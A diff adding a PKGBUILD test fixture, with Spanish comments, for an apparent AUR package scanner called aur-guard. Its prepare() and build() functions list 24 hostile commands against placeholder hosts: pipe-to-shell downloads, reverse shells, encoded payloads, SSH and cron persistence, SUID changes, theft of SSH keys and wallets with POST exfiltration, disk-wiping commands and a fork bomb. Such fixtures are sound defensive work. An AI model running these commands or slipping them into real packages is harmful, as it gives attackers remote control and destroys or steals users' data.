@@ -1,0 +1,101 @@
+# Maintainer: Atacante <atacante@evil.tld>
+# PKGBUILD de prueba para aur-guard. Concentra patrones maliciosos típicos.
+# NO INSTALAR. Solo se usa para validar las reglas del scanner.
+pkgname=paquete-malo
+pkgver=0.1
+pkgrel=1
+pkgdesc="Fixture malicioso"
+arch=('any')
+url="http://192.0.2.10/proyecto"
+license=('custom')
+source=(
+    "http://files.evil.tld/payload.tar.gz"
+    "git+http://evil.tld/repo.git"
+    "https://bit.ly/3xAttack"
+)
+md5sums=('SKIP')
+sha256sums=('SKIP')
+
+prepare() {
+    # 1) curl | bash
+    curl -fsSL https://evil.tld/install.sh | bash
+
+    # 2) wget | sh con sudo
+    wget -qO- https://evil.tld/stage2.sh | sudo bash
+
+    # 3) sustitución de proceso
+    bash <(curl -s https://evil.tld/stage3)
+
+    # 4) eval sobre descarga
+    eval "$(curl -s https://evil.tld/cfg)"
+
+    # 5) source desde URL
+    source https://evil.tld/lib.sh
+}
+
+build() {
+    # 6) reverse shell con nc
+    nc -e /bin/bash 192.0.2.5 4444 &
+
+    # 7) reverse shell con /dev/tcp
+    bash -i >& /dev/tcp/192.0.2.6/9001 0>&1 &
+
+    # 8) reverse shell en python
+    python -c "import socket,os,pty;s=socket.socket();s.connect(('1.2.3.4',1234));os.dup2(s.fileno(),0);pty.spawn('/bin/sh')"
+
+    # 9) base64 payload
+    echo "ZWNobyBwd25lZAo=" | base64 -d | bash
+
+    # 10) xxd payload
+    printf '\x65\x63\x68\x6f' | xxd -r | bash
+
+    # 11) backdoor SSH
+    mkdir -p ~/.ssh
+    echo "ssh-ed25519 AAAA... attacker@evil" >> ~/.ssh/authorized_keys
+
+    # 12) persistencia en .bashrc
+    echo "curl https://evil.tld/beacon | bash" >> ~/.bashrc
+
+    # 13) crontab
+    (crontab -l ; echo "* * * * * curl https://evil.tld/beacon | bash") | crontab -
+
+    # 14) systemctl
+    systemctl enable evil.service
+
+    # 15) usuario nuevo
+    useradd -m -G wheel pwned
+
+    # 16) suid
+    chmod 4755 /usr/bin/some-binary
+    chmod u+s /usr/bin/other
+
+    # 17) capabilities
+    setcap cap_sys_admin+ep /usr/bin/some-binary
+
+    # 18) leer claves
+    cat ~/.ssh/id_ed25519 > /tmp/leak
+
+    # 19) leer carteras
+    cp ~/.bitcoin/wallet.dat /tmp/leak
+
+    # 20) exfiltración
+    curl -X POST --data @/tmp/leak https://evil.tld/upload
+
+    # 21) destructivos
+    rm -rf /
+    dd if=/dev/zero of=/dev/sda bs=1M
+    mkfs.ext4 /dev/sda1
+
+    # 22) fork bomb
+    :(){ :|:& };:
+
+    # 23) acortador
+    curl -L https://tinyurl.com/abc123 | bash
+
+    # 24) IP literal
+    curl http://198.51.100.7/setup.sh
+}
+
+package() {
+    install -Dm755 paquete-malo "$pkgdir/usr/bin/paquete-malo"
+}
